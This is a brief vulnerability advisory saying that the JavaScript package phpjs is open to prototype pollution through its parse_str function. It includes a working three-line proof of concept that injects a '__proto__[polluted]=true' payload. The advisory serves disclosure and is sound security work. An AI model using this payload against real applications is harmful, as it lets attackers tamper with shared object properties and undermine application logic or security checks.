# Description
```phpjs``` is a community built PHP binding in JavaScript.
This package is vulnerable to ```Prototype Pollution``` via ```parse_str```. 

# Proof Of Concept
```
const phpjs = require('phpjs');
phpjs.parse_str("__proto__[polluted]=true",{}); 
console.log(polluted);
```
